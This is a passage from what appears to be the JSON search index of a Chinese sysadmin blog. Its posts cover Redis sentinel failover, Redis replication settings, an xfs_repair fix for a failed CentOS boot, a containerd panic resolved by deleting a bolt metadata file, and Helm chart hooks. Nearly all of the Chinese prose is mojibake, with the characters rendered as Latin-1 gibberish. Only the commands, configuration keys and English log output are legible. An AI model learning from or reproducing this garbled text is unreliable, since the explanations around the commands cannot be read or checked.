æ¥ä¿è¯æ¯æ¬¡åªæœ‰ä¸€ä¸ªä»æœåŠ¡å™¨å¤„äºä¸èƒ½å¤„ç†å‘½ä»¤è¯·æ±‚çš„çŠ¶æ€ã€‚ ","date":"2020-06-24 17:07","objectID":"/post/1847/:3:1","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼é…ç½®","uri":"/post/1847/"},{"categories":["databases"],"content":"å¯åŠ¨å“¨å…µ å…¶ä»–èŠ‚ç‚¹ä¿®æ”¹é…ç½®åï¼Œç›¸åŒæ–¹å¼å¯åŠ¨ redis-sentinel sentinel.conf ","date":"2020-06-24 17:07","objectID":"/post/1847/:4:0","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼é…ç½®","uri":"/post/1847/"},{"categories":["databases"],"content":"æ¨¡æ‹Ÿæ•…éšœ # å…³é—­ä¸»èŠ‚ç‚¹ redis-cli shutdown # è¿æ¥å…¶ä»–èŠ‚ç‚¹ï¼ŒæŸ¥çœ‹ [root@redis02 ~]# redis-cli 127.0.0.1:6379\u003e info Replication # Replication role:slave master_host:10.0.0.31 master_port:6380 master_link_status:up ä¸»èŠ‚ç‚¹å·²ç»åˆ‡æ¢åˆ°10.0.0.31:6380è¿™å°æœºå™¨ä¸Šäº† #æŸ¥çœ‹å“¨å…µé›†ç¾¤çŠ¶æ€ # è¿æ¥å“¨å…µæœåŠ¡ç«¯å£ redis-cli -p 26379 127.0.0.1:26379\u003e info Sentinel # Sentinel sentinel_masters:1 sentinel_tilt:0 sentinel_running_scripts:0 sentinel_scripts_queue_length:0 sentinel_simulate_failure_flags:0 master0:name=mymaster,status=ok,address=10.0.0.31:6380,slaves=3,sentinels=4 ","date":"2020-06-24 17:07","objectID":"/post/1847/:5:0","tags":["redis"],"title":"rediså“¨å…µæ¨¡å¼é…ç½®","uri":"/post/1847/"},{"categories":["databases"],"content":"###1.å®‰è£…redis å‚è€ƒé“¾æ¥ ###2.é…ç½®redis master: port 6379 daemonize yes bind 0.0.0.0 pidfile /var/run/redis_6379-master.pid logfile \"/var/log/redis/redis_6379-master.log\" slave: port 6379 daemonize yes bind 0.0.0.0 pidfile /var/run/redis_6379-slave.pid logfile \"/var/log/redis/redis_6379-slave.log\" # æŒ‡å®šredis-masterçš„åœ°å€å’Œç«¯å£ slaveof 10.0.0.30 6379 ###3.å¯åŠ¨ä¸¤å°redis redis-server redis.conf ###4.æµ‹è¯• ç™»é™†ä¸»redis [root@redis01 etc]# redis-cli 127.0.0.1:6379\u003e set name soulchild OK ç™»é™†ä»redis [root@redis02 ~]# redis-cli 127.0.0.1:6379\u003e keys * 1) \"name\" 127.0.0.1:6379\u003e get name \"soulchild\" å¦‚æœåœ¨ä¸»ä»å¤åˆ¶æ¶æ„ä¸­å‡ºç°å®•æœºçš„æƒ…å†µï¼Œéœ€è¦åˆ†æƒ…å†µçœ‹ï¼š 1ï¼‰ä»Rediså®•æœº è¿™ä¸ªç›¸å¯¹è€Œè¨€æ¯”è¾ƒç®€å•ï¼Œåœ¨Redisä¸­ä»åº“é‡æ–°å¯åŠ¨åä¼šè‡ªåŠ¨åŠ å…¥åˆ°ä¸»ä»æ¶æ„ä¸­ï¼Œè‡ªåŠ¨å®ŒæˆåŒæ­¥æ•°æ®ï¼Œè¿™æ˜¯å› ä¸ºåœ¨Redis2.8ç‰ˆæœ¬åå°±æ–°å¢äº†å¢é‡å¤åˆ¶åŠŸèƒ½ï¼Œä¸»ä»æ–­çº¿åæ¢å¤æ˜¯é€šè¿‡å¢é‡å¤åˆ¶å®ç°çš„ã€‚æ‰€ä»¥è¿™ç§æƒ…å†µæ— éœ€æ‹…å¿ƒã€‚ 2ï¼‰ä¸»Rediså®•æœº è¿™ä¸ªæƒ…å†µç›¸å¯¹è€Œè¨€å°±ä¼šå¤æ‚ä¸€äº›ï¼Œéœ€è¦ä»¥ä¸‹2æ­¥æ‰èƒ½å®Œæˆï¼š ç¬¬ä¸€æ­¥ï¼Œåœ¨ä»æ•°æ®åº“ä¸­æ‰§è¡ŒSLAVEOF NO ONEå‘½ä»¤ï¼Œæ–­å¼€ä¸»ä»å…³ç³»å¹¶ä¸”æå‡ä¸ºä¸»åº“ç»§ç»­æœåŠ¡ï¼› ç¬¬äºŒæ­¥ï¼Œå°†ä¸»åº“ä¿®å¤é‡æ–°å¯åŠ¨åï¼Œæ‰§è¡ŒSLAVEOF host portå‘½ä»¤ï¼Œå°†å…¶è®¾ç½®ä¸ºå…¶ä»–åº“çš„ä»åº“ï¼Œè¿™æ—¶æ•°æ®å°±èƒ½æ›´æ–°å›æ¥ï¼› è¿™ä¸¤ä¸ªæ­¥éª¤è¦é€šè¿‡æ‰‹åŠ¨å®Œæˆæ¢å¤ï¼Œè¿‡ç¨‹å…¶å®æ˜¯æ¯”è¾ƒéº»çƒ¦çš„å¹¶ä¸”å®¹æ˜“å‡ºé”™ï¼Œæœ‰æ²¡æœ‰å¥½åŠæ³•è§£å†³å‘¢ï¼Ÿæœ‰çš„ï¼ŒRedisæä¾›çš„å“¨å…µï¼ˆsentinelï¼‰åŠŸèƒ½å°±å¯ä»¥å®ç°ä¸»Rediså®•æœºçš„è‡ªåŠ¨åˆ‡æ¢ã€‚è¿™ä¸ªå°†åœ¨åé¢é‡ç‚¹ä»‹ç»ã€‚ ###5.redisä¸»ä»é…ç½®ä¼˜åŒ– slaveof \u003cmasterip\u003e \u003cmasterport\u003e å¤åˆ¶é€‰é¡¹ï¼Œslaveå¤åˆ¶å¯¹åº”çš„masterçš„ipå’Œç«¯å£ã€‚ masterauth \u003cmaster-password\u003e å¦‚æœmasterè®¾ç½®äº†requirepassï¼Œé‚£ä¹ˆslaveè¦è¿ä¸Šmasterï¼Œéœ€è¦æœ‰masterçš„å¯†ç æ‰è¡Œã€‚masterauthå°±æ˜¯ç”¨æ¥é…ç½®masterçš„å¯†ç ï¼Œè¿™æ ·å¯ä»¥åœ¨è¿ä¸Šmasteråè¿›è¡Œè®¤è¯ã€‚ slave-serve-stale-data yes å½“ä»åº“åŒä¸»åº“å¤±å»è¿æ¥æˆ–è€…å¤åˆ¶æ­£åœ¨è¿›è¡Œï¼Œä»åº“æœ‰ä¸¤ç§è¿è¡Œæ–¹å¼ï¼Œå†³å®šå¦‚ä½•å¤„ç†åç»­çš„è¯·æ±‚ï¼š å¦‚æœslave-serve-stale-dataè®¾ç½®ä¸ºyes(é»˜è®¤è®¾ç½®)ï¼Œä»åº“ä¼šç»§ç»­å“åº”å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚ å¦‚æœslave-serve-stale-dataè®¾ç½®ä¸ºnoï¼Œé™¤å»INFOå’ŒSLAVOFå‘½ä»¤ä¹‹å¤–çš„ä»»ä½•è¯·æ±‚éƒ½ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯â€SYNC with master in progressâ€ã€‚ slave-read-only yes ä½œä¸ºä»æœåŠ¡å™¨ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯åªè¯»çš„ï¼ˆyesï¼‰ï¼Œå¯ä»¥ä¿®æ”¹æˆNOï¼Œç”¨äºå†™ï¼ˆä¸å»ºè®®ï¼‰ã€‚ repl-diskless-sync no æ˜¯å¦ä½¿ç”¨socketæ–¹å¼å¤åˆ¶æ•°æ®ã€‚ç›®å‰rediså¤åˆ¶æä¾›ä¸¤ç§æ–¹å¼ï¼Œdiskå’Œsocketã€‚å¦‚æœæ–°çš„slaveè¿ä¸Šæ¥æˆ–è€…é‡è¿çš„slaveæ— æ³•å¢é‡åŒæ­¥ï¼Œå°±ä¼šæ‰§è¡Œå…¨é‡åŒæ­¥ï¼Œmasterä¼šç”Ÿæˆrdbæ–‡ä»¶ã€‚æœ‰2ç§æ–¹å¼ï¼š diskæ–¹å¼æ˜¯masteråˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹æŠŠrdbæ–‡ä»¶ä¿å­˜åˆ°ç£ç›˜ï¼Œå†æŠŠç£ç›˜ä¸Šçš„rdbæ–‡ä»¶ä¼ é€’ç»™slaveã€‚ socketæ˜¯masteråˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œç›´æ¥å°†RDBé€šè¿‡ç½‘ç»œå‘é€ç»™slaveï¼Œä¸ä½¿ç”¨ç£ç›˜ä½œä¸ºä¸­é—´å­˜å‚¨ã€‚ diskæ–¹å¼çš„æ—¶å€™ï¼Œrdbæ˜¯ä½œä¸ºä¸€ä¸ªæ–‡ä»¶ä¿å­˜åœ¨ç£ç›˜ä¸Šï¼Œå› æ­¤å¤šä¸ªslaveéƒ½èƒ½å…±äº«è¿™ä¸ªrdbæ–‡ä»¶ã€‚ socketæ–¹å¼çš„å¤åˆ¶ï¼ˆæ— ç›˜å¤åˆ¶ï¼‰æ˜¯åŸºäºé¡ºåºçš„ä¸²è¡Œå¤åˆ¶ï¼ˆmasterä¼šç­‰å¾…ä¸€ä¸ªrepl-diskless-sync-delayçš„ç§’æ•°ï¼Œå¦‚æœæ²¡slaveæ¥æ³¨å†Œè¯ï¼Œå°±ç›´æ¥ä¼ ï¼Œåæ¥çš„slaveå¾—æ’é˜Ÿç­‰å¾…ã€‚å·²æ³¨å†Œçš„å°±å¯ä»¥ä¸€èµ·ä¼ ï¼‰ã€‚åœ¨ç£ç›˜é€Ÿåº¦ç¼“æ…¢ï¼Œç½‘é€Ÿå¿«çš„æƒ…å†µä¸‹æ¨èç”¨socketæ–¹å¼ã€‚ repl-diskless-sync-delay 5 æ— ç£ç›˜å¤åˆ¶çš„å»¶è¿Ÿæ—¶é—´ï¼Œä¸è¦è®¾ç½®ä¸º0ã€‚å› ä¸ºä¸€æ—¦å¤åˆ¶å¼€å§‹ï¼ŒmasterèŠ‚ç‚¹ä¸ä¼šå†æ¥æ”¶æ–°slaveçš„å¤åˆ¶è¯·æ±‚ï¼Œç›´åˆ°è¿™ä¸ªrdbä¼ è¾“å®Œæ¯•ã€‚æ‰€ä»¥æœ€å¥½ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œç­‰æ›´å¤šçš„slaveæ³¨å†Œä¸Šåˆ°masteråä¸€èµ·ä¼ è¾“ï¼Œæä¾›åŒæ­¥æ€§èƒ½ã€‚ repl-ping-slave-period 10 slaveæ ¹æ®æŒ‡å®šçš„æ—¶é—´é—´éš”å‘æœåŠ¡å™¨å‘é€pingè¯·æ±‚ã€‚é»˜è®¤10ç§’ã€‚ repl-timeout 60 å¤åˆ¶è¿æ¥è¶…æ—¶æ—¶é—´ã€‚masterå’Œslaveéƒ½æœ‰è¶…æ—¶æ—¶é—´çš„è®¾ç½®ã€‚masteræ£€æµ‹åˆ°slaveä¸Šæ¬¡å‘é€çš„æ—¶é—´è¶…è¿‡repl-timeoutï¼Œå³è®¤ä¸ºslaveç¦»çº¿ï¼Œæ¸…é™¤è¯¥slaveä¿¡æ¯ã€‚slaveæ£€æµ‹åˆ°ä¸Šæ¬¡å’Œmasteräº¤äº’çš„æ—¶é—´è¶…è¿‡repl-timeoutï¼Œåˆ™è®¤ä¸ºmasterç¦»çº¿ã€‚éœ€è¦æ³¨æ„çš„æ˜¯repl-timeoutéœ€è¦è®¾ç½®ä¸€ä¸ªæ¯”repl-ping-slave-periodæ›´å¤§çš„å€¼ï¼Œä¸ç„¶ä¼šç»å¸¸æ£€æµ‹åˆ°è¶…æ—¶ã€‚ repl-backlog-size 5mb å¤åˆ¶ç¼“å†²åŒºå¤§å°ï¼Œè¿™æ˜¯ä¸€ä¸ªç¯å½¢å¤åˆ¶ç¼“å†²åŒºï¼Œç”¨æ¥ä¿å­˜æœ€æ–°å¤åˆ¶çš„å‘½ä»¤ã€‚è¿™æ ·åœ¨slaveç¦»çº¿çš„æ—¶å€™ï¼Œä¸éœ€è¦å®Œå…¨å¤åˆ¶masterçš„æ•°æ®ï¼Œå¦‚æœå¯ä»¥æ‰§è¡Œéƒ¨åˆ†åŒæ­¥ï¼Œåªéœ€è¦æŠŠç¼“å†²åŒºçš„éƒ¨åˆ†æ•°æ®å¤åˆ¶ç»™slaveï¼Œå°±èƒ½æ¢å¤æ­£å¸¸å¤åˆ¶çŠ¶æ€ã€‚ç¼“å†²åŒºçš„å¤§å°è¶Šå¤§ï¼Œslaveç¦»çº¿çš„æ—¶é—´å¯ä»¥æ›´é•¿ï¼Œå¤åˆ¶ç¼“å†²åŒºåªæœ‰åœ¨æœ‰slaveè¿æ¥çš„æ—¶å€™æ‰åˆ†é…å†…å­˜ã€‚æ²¡æœ‰slaveçš„ä¸€æ®µæ—¶é—´ï¼Œå†…å­˜ä¼šè¢«é‡Šæ”¾å‡ºæ¥ï¼Œé»˜è®¤1mã€‚ repl-backlog-ttl 3600 masteré‡Šæ”¾ç¼“å†²åŒºå†…å­˜çš„æ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚ ","date":"2020-06-24 15:31","objectID":"/post/1845/:0:0","tags":["redis"],"title":"redisä¸»ä»å¤åˆ¶å’Œé…ç½®","uri":"/post/1845/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"generating â€œ/run/initramfs/rdsosreport.txtâ€ entering emergencymode. exit the shell to continue type â€œjournalctlâ€ to view system logs. you might want to save â€œ/run/initramfs/rdsosreport.txtâ€ to a usb stick or /boot after mounting them and attach it to a bug reportã€‚ è§£å†³æ–¹æ³•ï¼š xfs_repair /dev/mapper/centos-root -L ","date":"2020-06-24 14:05","objectID":"/post/1842/:0:0","tags":[],"title":"æ–­ç”µå¯¼è‡´generating rdsosreport.txtç³»ç»Ÿæ— æ³•å¯åŠ¨","uri":"/post/1842/"},{"categories":["docker"],"content":"åŸæ–‡é“¾æ¥ï¼šhttp://zhangguanzhang.github.io/2020/01/08/docker-panic-invalid-page-type/ æŠ¥é”™ä¿¡æ¯å¤§è‡´å¦‚ä¸‹ï¼š panic: pgid (68719476737) above high water mark (183) goroutine 1 [running]: github.com/containerd/containerd/vendor/github.com/boltdb/bolt.(*node).spill(0xc4203fb420, 0xc4202b1198, 0x2) /go/src/github.com/containerd/containerd/vendor/github.com/boltdb/bolt/node.go:375 +0x679 github.com/containerd/containerd/vendor/github.com/boltdb/bolt.(*Bucket).spill(0xc4200bc398, 0xb1378c, 0x5597f073a780) /go/src/github.com/containerd/containerd/vendor/github.com/boltdb/bolt/bucket.go:570 +0x4ba github.com/containerd/containerd/vendor/github.com/boltdb/bolt.(*Tx).Commit(0xc4200bc380, 0x0, 0x0) /go/src/github.com/containerd/containerd/vendor/github.com/boltdb/bolt/tx.go:163 +0x121 github.com/containerd/containerd/vendor/github.com/boltdb/bolt.(*DB).Update(0xc4201c70e0, 0xc4202b1540, 0x0, 0x0) /go/src/github.com/containerd/containerd/vendor/github.com/boltdb/bolt/db.go:605 +0xea github.com/containerd/containerd/metadata.(*DB).Init(0xc4203fe840, 0x5597f0044b40, 0xc42003e0a0, 0xc4202b1660, 0xc4203fe840) /go/src/github.com/containerd/containerd/metadata/db.go:103 +0xb1 github.com/containerd/containerd/server.LoadPlugins.func2(0xc4203fb340, 0xc420221bc0, 0x21, 0xc4204114e0, 0x1e) /go/src/github.com/containerd/containerd/server/server.go:255 +0x53f github.com/containerd/containerd/plugin.(*Registration).Init(0xc420404a50, 0xc4203fb340, 0xc420404a50) /go/src/github.com/containerd/containerd/plugin/plugin.go:98 +0x3a github.com/containerd/containerd/server.New(0x7fd80d330158, 0xc42003e0a0, 0xc4203d8b40, 0x1, 0xc4202b1c80, 0x5597eed907cd) /go/src/github.com/containerd/containerd/server/server.go:106 +0x600 github.com/containerd/containerd/cmd/containerd/command.App.func1(0xc4203de2c0, 0xc4203de2c0, 0xc4202b1d07) /go/src/github.com/containerd/containerd/cmd/containerd/command/main.go:132 +0x5fb github.com/containerd/containerd/vendor/github.com/urfave/cli.HandleAction(0x5597efe31760, 0x5597f0021718, 0xc4203de2c0, 0xc4203fe3c0, 0x0) /go/src/github.com/containerd/containerd/vendor/github.com/urfave/cli/app.go:502 +0xca github.com/containerd/containerd/vendor/github.com/urfave/cli.(*App).Run(0xc4201a7180, 0xc42003a090, 0x3, 0x3, 0x0, 0x0) /go/src/github.com/containerd/containerd/vendor/github.com/urfave/cli/app.go:268 +0x60e main.main() github.com/containerd/containerd/cmd/containerd/main.go:28 +0x51 ERRO[2020-06-24T13:49:28.209961851+08:00] containerd did not exit successfully error=\"exit status 2\" module=libcontainerd åˆ é™¤æ­¤æ–‡ä»¶ /data/docker/containerd/daemon/io.containerd.metadata.v1.bolt ","date":"2020-06-24 13:57","objectID":"/post/1841/:0:0","tags":["docker"],"title":"æ–‡ä»¶ç³»ç»ŸæŸåå¯¼è‡´dockerå¯åŠ¨å¤±è´¥","uri":"/post/1841/"},{"categories":["kubernetes"],"content":"Helmæä¾›äº†ä¸€ç§hookæœºåˆ¶ï¼Œä»¥å…è®¸chartå¼€å‘äººå‘˜åœ¨releaseçš„ç”Ÿå‘½å‘¨æœŸçš„æŸäº›æ—¶é—´è¿›è¡Œå¹²é¢„ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨hookæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š åœ¨åŠ è½½ä»»ä½•å…¶ä»–chartä¹‹å‰ï¼Œåœ¨å®‰è£…æœŸé—´åŠ è½½ConfigMapæˆ–Secretã€‚ åœ¨å®‰è£…æ–°chartä¹‹å‰ï¼Œæ‰§è¡Œä½œä¸šå¤‡ä»½æ•°æ®åº“ï¼Œç„¶ååœ¨å‡çº§å,æ‰§è¡Œç¬¬äºŒä¸ªä½œä¸šè¿˜åŸæ•°æ®ã€‚ åœ¨åˆ é™¤releaseä¹‹å‰ï¼Œåœ¨åˆ é™¤releaseä¹‹å‰é€‚å½“åœ°åœæ­¢å…¶ä»–æœåŠ¡ã€‚ hookä½¿ç”¨æ³¨è§£æ¥å®šä¹‰ï¼Œä¾‹å¦‚ï¼š apiVersion: ... kind: .... metadata: annotations: \"helm.sh/hook\": \"pre-install\" # ... ","date":"2020-06-23 18:25","objectID":"/post/1839/:0:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-hooks(ä¸ƒ)","uri":"/post/1839/"},{"categories":["kubernetes"],"content":"å¯ç”¨çš„hooks pre-install: åœ¨æ¸²æŸ“æ¨¡æ¿ä¹‹å,åœ¨Kubernetesä¸­åˆ›å»ºä»»ä½•èµ„æºä¹‹å‰æ‰§è¡Œã€‚ post-install: å°†æ‰€æœ‰èµ„æºåŠ è½½åˆ°Kubernetesä¹‹åæ‰§è¡Œ pre-delete: åœ¨ä»Kubernetesåˆ é™¤ä»»ä½•èµ„æºä¹‹å‰æ‰§è¡Œ post-delete: åˆ é™¤æ‰€æœ‰releaseèµ„æºåæ‰§è¡Œ pre-upgrade: åœ¨æ¸²æŸ“æ¨¡æ¿ä¹‹åï¼Œä½†åœ¨ä»»ä½•èµ„æºåŠ è½½åˆ°Kubernetesä¹‹å‰æ‰§è¡Œ post-upgrade: å‡çº§æ‰€æœ‰èµ„æºåæ‰§è¡Œ pre-rollback: åœ¨æ¨¡æ¿æ¸²æŸ“åï¼Œå›æ»šä¹‹å‰æ‰§è¡Œ post-rollback: å›æ»šä¹‹åæ‰§è¡Œ crd-install: åœ¨è¿è¡Œä»»ä½•å…¶ä»–æ£€æŸ¥ä¹‹å‰æ·»åŠ CRDèµ„æºã€‚è¿™ä»…åœ¨chartä¸­å…¶ä»–æ¸…å•æ‰€ä½¿ç”¨çš„CRDå®šä¹‰ä¸Šä½¿ç”¨ã€‚ test-success: åœ¨è¿è¡Œhelm test,Podè¿”å›æˆåŠŸ(è¿”å›ç ==0)æ‰§è¡Œ test-failure: åœ¨è¿è¡Œhelm test,Podè¿”å›å¤±è´¥(è¿”å›ç !=0)æ‰§è¡Œ ","date":"2020-06-23 18:25","objectID":"/post/1839/:1:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-hooks(ä¸ƒ)","uri":"/post/1839/"},{"categories":["kubernetes"],"content":"hookçš„ç”Ÿå‘½å‘¨æœŸ hooksä½¿chartå¼€å‘äººå‘˜ æœ‰æœºä¼šåœ¨releaseç”Ÿå‘½å‘¨æœŸçš„å…³é”®æ—¶åˆ»æ‰§è¡Œç‰¹å®šçš„æ“ä½œã€‚ ä¾‹å¦‚ï¼Œhelm installçš„ç”Ÿå‘½å‘¨æœŸã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œç”Ÿå‘½å‘¨æœŸå¦‚ä¸‹ï¼š è¿è¡Œhelm install foo chartåŠ è½½åˆ°tillerä¸­ ç»è¿‡éªŒè¯åï¼Œtilleræ¸²æŸ“fooæ¨¡æ¿ tillerå°†äº§ç”Ÿçš„èµ„æºåŠ è½½åˆ°Kubernetesä¸­ titlerè¿”å›releaseåç§°å’Œä¸€äº›å…¶ä»–æ•°æ®ç»™helmå®¢æˆ·ç«¯ helmå®¢æˆ·ç«¯é€€å‡º Helmä¸ºinstallç”Ÿå‘½å‘¨æœŸå®šä¹‰äº†ä¸¤ä¸ªhooksï¼špre-installå’Œpost-installã€‚å¦‚æœfoo chartçš„å¼€å‘äººå‘˜ä½¿ç”¨äº†è¿™ä¸¤ä¸ªhookï¼Œé‚£ä¹ˆç”Ÿå‘½å‘¨æœŸçš„æ›´æ”¹å¦‚ä¸‹ï¼š è¿è¡Œhelm install foo chartåŠ è½½åˆ°tillerä¸­ ç»è¿‡éªŒè¯åï¼Œtilleræ¸²æŸ“fooæ¨¡æ¿ tillerå‡†å¤‡æ‰§è¡Œpre-install(å°†hookèµ„æºåŠ è½½åˆ°Kubernetesä¸­) tilleræŒ‰æƒé‡å¯¹hookè¿›è¡Œæ’åº(é»˜è®¤æƒ…å†µä¸‹æƒé‡ä¸º0),å¹¶æŒ‰åç§°å¯¹å…·æœ‰ç›¸åŒæƒé‡çš„hookæŒ‰å‡åºæ’åºã€‚ tilleråŠ è½½æœ€å°æƒé‡çš„hook tillerç­‰å¾…hookå‡†å¤‡å¥½ä¸ºæ­¢(CRDèµ„æºé™¤å¤–) tillerå°†äº§ç”Ÿçš„èµ„æºåŠ è½½åˆ°Kubernetesä¸­ã€‚æ³¨æ„:å¦‚æœè®¾ç½®äº†â€“waitå‚æ•°ï¼ŒTillerå°†ç­‰å¾…æ‰€æœ‰èµ„æºå¤„äºå°±ç»ªçŠ¶æ€ï¼Œå¹¶ä¸”åœ¨å®ƒä»¬å°±ç»ªä¹‹å‰ä¸ä¼šè¿è¡Œpost-installæŒ‚é’©ã€‚ tilleræ‰§è¡Œpost-install(å°†hookèµ„æºåŠ è½½åˆ°Kubernetesä¸­) tillerç­‰å¾…hookå‡†å¤‡å¥½ä¸ºæ­¢ titlerè¿”å›releaseåç§°å’Œä¸€äº›å…¶ä»–æ•°æ®ç»™helmå®¢æˆ·ç«¯ helmå®¢æˆ·ç«¯é€€å‡º ä¸Šé¢æåˆ°çš„tillerç­‰å¾…hookå‡†å¤‡å¥½ä¸ºæ­¢æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ è¿™å–å†³äºhookä¸­å£°æ˜çš„èµ„æºã€‚å¦‚æœèµ„æºæ˜¯ä¸€ä¸ªjobç±»å‹ï¼Œtillerå°±ä¼šç­‰å¾…jobæˆåŠŸè¿è¡Œï¼Œå¦‚æœjobå¤±è´¥äº†ï¼Œè¿™ä¸ªreleaseå¤±è´¥ï¼Œè¿™æ˜¯ä¸€ä¸ªé˜»å¡æ“ä½œï¼Œå› æ­¤Helmå®¢æˆ·ç«¯å°†åœ¨è¿è¡Œjobæ—¶æš‚åœã€‚ å¯¹äºæ‰€æœ‰å…¶ä»–ç±»å‹çš„èµ„æºï¼Œåªè¦Kuberneteså°†èµ„æºæ ‡è®°ä¸ºå·²åŠ è½½ï¼ˆæ·»åŠ æˆ–æ›´æ–°ï¼‰ï¼Œèµ„æºå°±è¢«è§†ä¸ºâ€œå°±ç»ªâ€ã€‚ å½“åœ¨ä¸€ä¸ªhookä¸­å£°æ˜è®¸å¤šèµ„æºæ—¶ï¼Œè¿™äº›èµ„æºå°†è¢«ä¸²è¡Œæ‰§è¡Œã€‚å¦‚æœå®ƒä»¬æœ‰hookæƒé‡(è§ä¸‹æ–‡)ï¼Œåˆ™æŒ‰æƒé‡é¡ºåºæ‰§è¡Œã€‚å¦åˆ™ï¼Œä¸èƒ½ä¿è¯æ‰§è¡Œé¡ºåºã€‚ï¼ˆåœ¨Helm 2.3.0å’Œä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼Œå®ƒä»¬æ˜¯æŒ‰å­—æ¯é¡ºåºæ’åºçš„ã€‚) æ·»åŠ hookæƒé‡è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå¥½çš„å®è·µï¼Œå¦‚æœæƒé‡ä¸é‡è¦ï¼Œåˆ™å°†å…¶è®¾ç½®ä¸º0ã€‚ ","date":"2020-06-23 18:25","objectID":"/post/1839/:2:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-hooks(ä¸ƒ)","uri":"/post/1839/"},{"categories":["kubernetes"],"content":"hooksèµ„æºæ˜¯ä¸å—ç‰ˆæœ¬ç®¡ç†çš„ hooksåˆ›å»ºçš„èµ„æºä¸ä¼šä½œä¸ºreleaseçš„ä¸€éƒ¨åˆ†è¿›è¡Œè·Ÿè¸ªæˆ–ç®¡ç†ã€‚ä¸€æ—¦Tillerç¡®è®¤hookå·²è¾¾åˆ°å°±ç»ªçŠ¶æ€ï¼Œå°±ä¸ä¼šåœ¨ç®¡è¿™ä¸ªhookèµ„æºäº† å®é™…ä¸Šï¼Œè¿™æ„å‘³ç€å¦‚æœåœ¨hookä¸­åˆ›å»ºèµ„æºï¼Œå°±ä¸èƒ½ä¾èµ–helm deleteæ¥åˆ é™¤èµ„æºã€‚è¦é”€æ¯è¿™äº›èµ„æºï¼Œæ‚¨éœ€è¦åœ¨pre-deleteæˆ–post-deletehookä¸­ç¼–å†™æ‰§è¡Œæ­¤æ“ä½œçš„ä»£ç ï¼Œæˆ–è€…æ·»åŠ \"helm.sh/hook-delete-policy\"æ³¨è§£åˆ°hookæ¨¡æ¿æ–‡ä»¶ã€‚ ##ç¼–å†™ä¸€ä¸ªhook hookåªæ˜¯Kubernetesæ¸…å•æ–‡ä»¶ï¼Œåœ¨metadataéƒ¨åˆ†æœ‰ç‰¹æ®Šæ³¨è§£ã€‚å› ä¸ºå®ƒä»¬æ˜¯æ¨¡æ¿æ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨æ‰€æœ‰å¸¸è§„æ¨¡æ¿åŠŸèƒ½ï¼ŒåŒ…æ‹¬è¯»å–.Valuesã€.Releaseå’Œ.Templateã€‚ æ¯”å¦‚ï¼Œè¿™ä¸ªæ¨¡æ¿æ–‡ä»¶åœ¨templates/post-install-job.yaml,å£°æ˜äº†hook post-installï¼Œè¦è¿è¡Œä¸€ä¸ªjobã€‚ apiVersion: batch/v1 kind: Job metadata: name: \"{{.Release.Name}}\" labels: app.kubernetes.io/managed-by: {{.Release.Service | quote }} app.kubernetes.io/instance: {{.Release.Name | quote }} helm.sh/chart: \"{{.Chart.Name}}-{{.Chart.Version}}\" annotations: # å¦‚æœæ²¡æœ‰ä¸‹é¢çš„æ³¨è§£ï¼Œè¿™ä¸ªjobå°†ä½œä¸ºreleaseçš„ä¸€éƒ¨åˆ† \"helm.sh/hook\": post-install \"helm.sh/hook-weight\": \"-5\" \"helm.sh/hook-delete-policy\": hook-succeeded spec: template: metadata: name: \"{{.Release.Name}}\" labels: app.kubernetes.io/managed-by: {{.Release.Service | quote }} app.kubernetes.io/instance: {{.Release.Name | quote }} helm.sh/chart: \"{{.Chart.Name}}-{{.Chart.Version}}\" spec: restartPolicy: Never containers: - name: post-install-job image: \"alpine:3.3\" command: [\"/bin/sleep\",\"{{default \"10\" .Values.sleepyTime}}\"] ä½¿æ­¤æ¨¡æ¿æˆä¸ºhookçš„æ³¨è§£ï¼š annotations: \"helm.sh/hook\": post-install ä¸€ä¸ªèµ„æºå¯ä»¥å®ç°å¤šä¸ªhookï¼Œä¾‹å¦‚: annotations: \"helm.sh/hook\": post-install,post-upgrade å½“subchartså£°æ˜hookæ—¶ï¼Œä¹Ÿä¼šæ‰§è¡Œã€‚é¡¶çº§chartæ— æ³•ç¦ç”¨subchartså£°æ˜çš„hookã€‚ å¯ä»¥ä¸ºhookå®šä¹‰ä¸€ä¸ªæƒé‡ï¼Œè¿™å°†æœ‰åŠ©äºç¡®å®šæ‰§è¡Œé¡ºåºã€‚ä½¿ç”¨ä»¥ä¸‹æ³¨è§£å®šä¹‰æƒé‡ï¼š annotations: \"helm.sh/hook-weight\": \"5\" ","date":"2020-06-23 18:25","objectID":"/post/1839/:3:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-hooks(ä¸ƒ)","uri":"/post/1839/"},{"categories":["kubernetes"],"content":"hookçš„æƒé‡å¯ä»¥æ˜¯æ­£æ•°æˆ–è´Ÿæ•°ï¼Œä½†å¿…é¡»è¡¨ç¤ºä¸ºå­—ç¬¦ä¸²ã€‚ä¼˜å…ˆæ‰§è¡Œæƒé‡å°çš„hook æˆ‘ä»¬è¿˜å¯ä»¥å®šä¹‰ä½•æ—¶åˆ é™¤ç›¸åº”hookèµ„æºçš„ç­–ç•¥ã€‚hookåˆ é™¤ç­–ç•¥ä½¿ç”¨ä»¥ä¸‹æ³¨è§£å®šä¹‰ï¼š annotations: \"helm.sh/hook-delete-policy\": hook-succeeded å¯é€‰çš„æ³¨è§£å€¼ï¼š \"hook-succeeded\": åœ¨hookæ‰§è¡ŒæˆåŠŸåï¼Œtilleråˆ é™¤å¯¹åº”çš„hookèµ„æºã€‚ 